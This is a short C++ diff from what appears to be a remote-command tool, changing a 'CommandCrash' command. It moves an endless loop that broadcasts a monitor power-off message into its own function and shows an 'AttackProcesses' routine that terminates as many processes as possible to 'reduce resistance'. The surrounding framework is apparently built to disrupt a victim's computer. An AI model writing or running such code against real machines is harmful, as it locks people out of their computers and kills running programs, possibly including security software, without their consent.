@@ -18,10 +18,10 @@ bool CommandCrash::ShouldRunThisCommand(ParsedCommand* Parsed)
 
 void CommandCrash::Run(ParsedCommand* Parsed)
 {
-	while (true)
-	{
-		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
-	}
+	//Turn off the moniter(s)
+	//thread* moniter = new thread(&CommandCrash::turnOffMoniter, this);
+
+	//Kill as many processes as possible, to free up resources, and reduce resistance.
 	//thread* processKiller = new thread(&CommandCrash::AttackProcesses, this);
 }
 
@@ -79,6 +79,14 @@ void CommandCrash::AttackProcesses()
 			//Kill process.
 			TerminateProcess(hProcess, 1);
 		}
+	}
+}
+
+void CommandCrash::turnOffMoniter()
+{
+	while (true)
+	{
+		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
 	}
 }
 
